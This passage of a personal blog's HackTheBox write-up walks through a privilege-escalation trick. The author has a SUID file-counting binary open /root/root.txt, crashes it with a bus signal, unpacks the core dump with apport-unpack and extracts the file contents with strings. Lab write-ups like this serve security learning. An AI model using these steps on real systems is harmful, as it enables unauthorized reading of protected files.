/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
</code></pre><p>what is <code>/opt/count</code>??</p>
<pre tabindex="0"><code>dasith@secret:/opt$ ls
code.c
count
valgrind.log
</code></pre><p>ok lets look at <code>code.c</code></p>
<p><code>$ cat /opt/code.c</code></p>
<p>I copied the code output in a file with same name for readabilty</p>
<p>Basically its just a program to count directories and files&hellip;</p>
<p>Note this privesc was a true nightmare XD&hellip;afer hours of suffering I just went to google a helping writeup/forum</p>
<p>A guy was able to read <code>root.txt</code> by crashing the binary and reading its dump strings</p>
<p>sounds kinda complex workaround&hellip;we need two shells so we run our curl payload again on another port (4444)</p>
<p>In shell 1: we run the SUID binary</p>
<pre tabindex="0"><code>$ cd /opt
$ ./count -p
/root/root.txt
y
</code></pre><p>I wait before pressing &rsquo;enter&rsquo; and go to shell 2:</p>
<pre tabindex="0"><code>$ ps -aux | grep count
root 841 0.0 0.1 235668 7428 ? Ssl 16:11 0:00 /usr/lib/accountsservice/accounts-daemon
dasith 1394 0.0 0.0 2488 520 ? S 16:24 0:00 ./count -p
dasith 1680 0.0 0.0 6432 672 ? S 16:25 0:00 grep count
</code></pre><p>I prepare my kill command and to shell 1 I run the counter</p>
<p><code>$ kill -BUS 1394</code></p>
<p>Mid-running I crash the bus and back to shell 1 I get a response</p>
<pre tabindex="0"><code>Bus error (core dumped)
</code></pre><p>we then go look for the dumps</p>
<pre tabindex="0"><code>$ cd /var/crash
$ ls
\_opt_count.0.crash
\_opt_count.1000.crash
\_opt_countzz.0.crash
</code></pre><p>we unpack count.1000 in a temporary folder</p>
<pre tabindex="0"><code>$ mkdir /tmp/crashlogs
$ apport-unpack \_opt_count.1000.crash /tmp/crashlogs
</code></pre><p>we go get our logs</p>
<pre tabindex="0"><code>$ cd /tmp/crashlogs
$ ls
Architecture
CoreDump
Date
DistroRelease
ExecutablePath
ExecutableTimestamp
ProblemType
ProcCmdline
ProcCwd
ProcEnviron
ProcMaps
ProcStatus
Signal
Uname
UserGroups
</code></pre><p>we can only read the strings of CoreDump so cat isnt useful here</p>
<p><code>$ strings CoreDump</code></p>
<pre tabindex="0"><code>...
Enter source file/directory name:
Total characters = 33
Total words = 2
Total lines = 2
Save results a file? [y/N]: Path:
oot/root.txt
Here_you_can_see_root_txt_content
aliases
...
</code></pre><p>Now let&rsquo;s think about all this&hellip;we couldn&rsquo;t get a root shell here&hellip;it was more a workaround to get the root flag.</p>
<p>This is definitelly not a easy machine&hellip;maybe medium&hellip;not too hard too but NOT EASY.</p>
<p>seems like we can access dasith ssh keys&hellip;But I could not crack it yet&hellip;</p>
<p>We technically do not own this machine so keep exploring for ways to get root.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/hackthebox/">HackTheBox</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2023</span>
            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>



    </body>
</html>
